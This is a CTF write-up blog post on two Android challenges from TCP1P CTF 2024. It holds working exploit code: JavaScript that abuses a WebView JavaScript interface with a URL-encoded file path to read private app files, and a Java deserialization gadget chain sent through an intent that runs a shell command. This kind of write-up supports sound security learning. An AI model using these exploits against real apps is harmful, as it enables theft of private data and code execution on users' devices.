<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>TCP1P CTF 2024 Android Writeup</title>

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>TCP1P CTF 2024 Android Writeup | grep-user blog</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="TCP1P CTF 2024 Android Writeup" />
<meta name="author" content="grep-user" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hey everyone, last weekend I participated in the much-anticipated TCP1P CTF. I had a great time with their mobile challenges last year, and this yearâ€™s challenges were just as good! This time we have 4 challenges and I was able to solve 2 challenges. This time they had poc tester which works well for the challenges. These challenges are now available in github." />
<meta property="og:description" content="Hey everyone, last weekend I participated in the much-anticipated TCP1P CTF. I had a great time with their mobile challenges last year, and this yearâ€™s challenges were just as good! This time we have 4 challenges and I was able to solve 2 challenges. This time they had poc tester which works well for the challenges. These challenges are now available in github." />
<link rel="canonical" href="http://localhost:8001/TCP1P-CTF-Android-Writeup" />
<meta property="og:url" content="http://localhost:8001/TCP1P-CTF-Android-Writeup" />
<meta property="og:site_name" content="grep-user blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-10-14T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="TCP1P CTF 2024 Android Writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"grep-user","url":"https://grep-user.github.io"},"dateModified":"2024-10-14T00:00:00+05:30","datePublished":"2024-10-14T00:00:00+05:30","description":"Hey everyone, last weekend I participated in the much-anticipated TCP1P CTF. I had a great time with their mobile challenges last year, and this yearâ€™s challenges were just as good! This time we have 4 challenges and I was able to solve 2 challenges. This time they had poc tester which works well for the challenges. These challenges are now available in github.","headline":"TCP1P CTF 2024 Android Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8001/TCP1P-CTF-Android-Writeup"},"url":"http://localhost:8001/TCP1P-CTF-Android-Writeup"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1>grep-user@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive"><h2 class="header-link">Archive</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>TCP1P CTF 2024 Android Writeup</h2>
  <time datetime="2024-10-14T00:00:00+05:30" class="by-line">14 Oct 2024</time>
  <p>Hey everyone, last weekend I participated in the much-anticipated TCP1P CTF. I had a great time with their mobile challenges last year, and this yearâ€™s challenges were just as good! This time we have 4 challenges and I was able to solve 2 challenges. This time they had poc <a href="https://github.com/TCP1P/Mobile-POC-Tester">tester</a> which works well for the challenges. These challenges are now <a href="https://github.com/TCP1P/TCP1P-CTF-2024-Challenges-Public">available</a> in github.</p>

<p><img src="../assets/2024/tcpip/tcpip1.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%" /></p>

<h3 id="contents">Contents</h3>
<ul>
  <li>Interfaces [Android]</li>
  <li>LookUp [Android]</li>
  <li>Password Manager 2.0 [Android]</li>
</ul>

<h3 id="interfaces-android">Interfaces [Android]</h3>

<p>In this challenge we have exported MainActivity and WebViewActivity. On launching the app, the main activity redirects us to WebviewActivity with URL <code class="language-plaintext highlighter-rouge">https://aimar.id</code>.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// MainActivity.java</span>
<span class="o">...</span>
<span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="nc">WebViewActivity</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span> <span class="s">"https://aimar.id/"</span><span class="o">);</span>
<span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
<span class="o">...</span>
</code></pre></div></div>

<p>The webview activity loads the given URL with vulnerable webview setting privileges. So Also the webview registers a javascript interface which looks suspicious which also hints us with the challenge title. Since the webview activity is exported we can pass any URL and make webview load it, but there is a catch. <code class="language-plaintext highlighter-rouge">isValidURL</code> checks whether the URL which we are trying to load is of <em>file</em> protocol. So our goal is to read the flag which is in the appâ€™s file directory.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// WebViewActivity.java</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
	<span class="o">...</span><span class="c1">// truncated</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span> <span class="o">=</span> <span class="n">webView</span><span class="o">;</span>
        <span class="nc">WebSettings</span> <span class="n">webSettings</span> <span class="o">=</span> <span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">();</span>
        <span class="n">webSettings</span><span class="o">.</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">webSettings</span><span class="o">.</span><span class="na">setAllowFileAccess</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">webSettings</span><span class="o">.</span><span class="na">setAllowContentAccess</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">webSettings</span><span class="o">.</span><span class="na">setAllowFileAccessFromFileURLs</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">webSettings</span><span class="o">.</span><span class="na">setAllowUniversalAccessFromFileURLs</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">addJavascriptInterface</span><span class="o">(</span><span class="k">new</span> <span class="nc">MyJavascriptInterface</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">),</span> <span class="n">randomString</span><span class="o">(</span><span class="mi">32</span><span class="o">));</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">setWebViewClient</span><span class="o">(</span><span class="k">new</span> <span class="nc">WebViewClient</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: app.aimar.id.interfaces.WebViewActivity.1</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceivedSslError</span><span class="o">(</span><span class="nc">WebView</span> <span class="n">view</span><span class="o">,</span> <span class="nc">SslErrorHandler</span> <span class="n">handler</span><span class="o">,</span> <span class="nc">SslError</span> <span class="n">error</span><span class="o">)</span> <span class="o">{</span>
                <span class="o">...</span> <span class="c1">// truncated</span>
            <span class="o">}</span>
        <span class="o">});</span>
        <span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">getIntent</span><span class="o">().</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">));</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">uri</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">isValidURL</span><span class="o">(</span><span class="n">uri</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">finish</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>

<span class="kd">public</span> <span class="nc">String</span> <span class="nf">randomString</span><span class="o">(</span><span class="kt">int</span> <span class="n">length</span><span class="o">)</span> <span class="o">{</span>
<span class="nc">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="o">(</span><span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">*</span> <span class="nc">Math</span><span class="o">.</span><span class="na">random</span><span class="o">());</span>
    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">index</span><span class="o">));</span>
<span class="o">}</span>
<span class="k">return</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
<span class="o">}</span>

<span class="kt">boolean</span> <span class="nf">isValidURL</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
<span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"file"</span><span class="o">))</span> <span class="o">{</span>
    <span class="nc">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="s">"WebViewActivity"</span><span class="o">,</span> <span class="s">"Invalid scheme: "</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">());</span>
    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="o">}</span>
<span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>To read file we can use javascript interface to load <em>file</em> URLs. But here the catch is if the URL contains <strong>flag.txt</strong> string it loads <code class="language-plaintext highlighter-rouge">aimar.id</code>. After fuzzing with webview, I found out that we can load URL encoded string in webview which while uri parsing wonâ€™t decode it. So the idea is to load our webpage and find the interface using javascript since <em>javascript</em> is enabled in webview. And then using the javascript interface to load URL encoded <em>file</em> URL. Even with <code class="language-plaintext highlighter-rouge">setAllowUniversalAccessFromFileURLs</code> I tried loading file using XMLHttpRequest as mentioned in this <a href="https://blog.oversecured.com/Android-security-checklist-webview/#attacks-where-universal-file-access-from-file-urls-is-enabled">blog</a> but it failed. Not sure whether new android apis prevents this.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// MyJavascriptInterface.java</span>
<span class="nd">@JavascriptInterface</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">loadUrlSafe</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">"flag.txt"</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">post</span><span class="o">(</span><span class="k">new</span> <span class="nc">Runnable</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: app.aimar.id.interfaces.MyJavascriptInterface.1</span>
            <span class="nd">@Override</span> <span class="c1">// java.lang.Runnable</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
                <span class="nc">MyJavascriptInterface</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="s">"https://aimar.id/"</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">});</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">post</span><span class="o">(</span><span class="k">new</span> <span class="nc">Runnable</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: app.aimar.id.interfaces.MyJavascriptInterface.2</span>
            <span class="nd">@Override</span> <span class="c1">// java.lang.Runnable</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
                <span class="nc">MyJavascriptInterface</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">});</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>I crafted the below javascript to find out the interface which in our case is random string of length 32. The used it to call the javascript Interface method <code class="language-plaintext highlighter-rouge">loadUrlSafe</code> with file URL.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">windows_obj</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">(</span><span class="nb">window</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="dl">""</span>
        <span class="kd">const</span> <span class="nx">findOne</span> <span class="o">=</span> <span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="c1">// Ensure that window[obj] is a valid object</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">[</span><span class="nx">obj</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="nx">obj</span><span class="p">]</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">(</span><span class="nb">window</span><span class="p">[</span><span class="nx">obj</span><span class="p">]);</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// Catch errors when trying to access certain properties</span>
                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
        <span class="p">};</span>

        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">windows_obj</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">window_obj</span> <span class="o">=</span> <span class="nx">windows_obj</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="p">??</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span> 

            <span class="k">if</span> <span class="p">(</span><span class="nx">window_obj</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">window_obj</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kd">var</span> <span class="nx">obj_props</span> <span class="o">=</span> <span class="nx">findOne</span><span class="p">(</span><span class="nx">window_obj</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="nx">obj_props</span> <span class="o">&amp;&amp;</span> <span class="nx">obj_props</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">loadUrlSafe</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="kr">interface</span> <span class="o">=</span> <span class="nx">window_obj</span><span class="p">;</span>
                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="kr">interface</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="kd">var</span> <span class="nx">interface_obj</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="kr">interface</span><span class="p">]</span>

        <span class="nx">interface_obj</span><span class="p">.</span><span class="nx">loadUrlSafe</span><span class="p">(</span><span class="dl">"</span><span class="s2">file:///data/user/0/app.aimar.id.interfaces/files/%66%6c%61%67%2e%74%78%74</span><span class="dl">"</span><span class="p">)</span>
	<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>And creating my poc app which sends the URL to the WebViewActivity.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>

        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"app.aimar.id.interfaces"</span><span class="o">,</span><span class="s">"app.aimar.id.interfaces.WebViewActivity"</span><span class="o">);</span>

        <span class="nc">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"https://white-misty-90.tiiny.site/"</span><span class="o">;</span> <span class="c1">// hosted HTML content </span>
        <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span><span class="n">url</span><span class="o">);</span>
        <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>Initially the challenge also checks if the domain name ends with <code class="language-plaintext highlighter-rouge">aimar.id</code> in isValidURL method. But later the challenge author updated it to load any URL to prevent solvers from buying domain ending with <code class="language-plaintext highlighter-rouge">aimar.id</code> since it has only endswith check. I couldnâ€™t find any way to laod arbitrary URL if this is present. Tried all these <a href="https://hackerone.com/reports/431002">tricks</a> but android parses url correctly now. Maybe they could have updated in recent APIs. Another way is find any xss in <code class="language-plaintext highlighter-rouge">aimar.id</code> host. But it is a static phpinfo page, even the php is updated to recent version. I will update here if challenge author posts any writeup.</p>

<p><img src="../assets/2024/tcpip/tcpip3.png" alt="" style="display:block; margin-left:auto; margin-right:auto;width=50%;height=50%" /></p>

<h3 id="lookup-android">LookUp [Android]</h3>

<p>This challenge took quite a while to complete, but I managed to solve it in the end. This challege has exported activity <code class="language-plaintext highlighter-rouge">RealTimeUpdateActivity</code> which does nothing but receiving our intent and reading extras from our intent. Since android bundle that can be <code class="language-plaintext highlighter-rouge">Parcelable and Serializable</code> objects. So it is clear our goal is to solve using deserialization. I have previous knowledge of deserialization in android reading these blogs <a href="https://github.com/modzero/modjoda">1</a> and <a href="https://shivasurya.me/security/android/android-security/2024/01/24/java-deserialization-rce-android-application-layer.html">2</a>.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">RealTimeUpdateActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
        <span class="nc">Bundle</span> <span class="n">bundle</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">bundle</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">extra</span> <span class="o">:</span> <span class="n">bundle</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span> <span class="o">{</span>
                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"extra"</span><span class="o">,</span> <span class="s">"sucessfully deserialized "</span> <span class="o">+</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="n">extra</span><span class="o">));</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Testing2</span> <span class="kd">implements</span> <span class="nc">Serializable</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">Object</span> <span class="n">object</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="nc">ObjectInputStream</span> <span class="n">ois</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ClassNotFoundException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
        <span class="n">ois</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"extra"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">object</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Testing</span> <span class="kd">implements</span> <span class="nc">Serializable</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">cmd</span><span class="o">;</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
        <span class="nc">StringBuilder</span> <span class="n">output</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cmd</span><span class="o">);</span>
            <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
            <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">line</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">output</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">reader</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                    <span class="k">return</span> <span class="n">output</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Also the challenge has the gadget class <code class="language-plaintext highlighter-rouge">Testing.java</code> which executes cmd. <code class="language-plaintext highlighter-rouge">Testing.java</code> which is serializable class which tries to read our object and construct it. Using these two we can create gadget chain and pass intent with serializable. When victim app reads <code class="language-plaintext highlighter-rouge">intent.getStringExtra()</code> , it calls readObject of our <code class="language-plaintext highlighter-rouge">Testing2</code> object which calls toString() method of <code class="language-plaintext highlighter-rouge">Testing</code> object and finally invoking <strong>exec</strong>.</p>

<p>For setting the variable <code class="language-plaintext highlighter-rouge">cmd</code> as well as <code class="language-plaintext highlighter-rouge">object</code> we can use Java reflections since there are no public setters to set it in the object. This is the common way used while exploiting deserialization bugs, a neat <a href="https://greyshell.github.io/posts/insecure_deserialization_java/">blog</a> explaining this.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>

    <span class="nd">@Override</span>
    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="nc">Testing</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"foobar::"</span><span class="o">,</span><span class="n">f</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>

            <span class="nc">Testing</span> <span class="n">testing</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Testing</span><span class="o">();</span>
            <span class="n">f</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">testing</span><span class="o">,</span><span class="s">"whoami"</span><span class="o">);</span>
            
            <span class="nc">Testing2</span> <span class="n">testing2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Testing2</span><span class="o">();</span>
            <span class="nc">Field</span> <span class="n">f2</span> <span class="o">=</span> <span class="nc">Testing2</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"object"</span><span class="o">);</span>
            <span class="n">f2</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="n">f2</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">testing2</span><span class="o">,</span><span class="n">testing</span><span class="o">);</span>

            <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
            <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.dimas.lookup"</span><span class="o">,</span><span class="s">"com.dimas.lookup.RealTimeUpdateActivity"</span><span class="o">);</span>

            <span class="nc">Bundle</span> <span class="n">bundle</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Bundle</span><span class="o">();</span>
            <span class="n">bundle</span><span class="o">.</span><span class="na">putSerializable</span><span class="o">(</span><span class="s">"exploit"</span><span class="o">,</span><span class="n">testing2</span><span class="o">);</span>
            <span class="n">intent</span><span class="o">.</span><span class="na">putExtras</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
            <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>


        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
	    <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

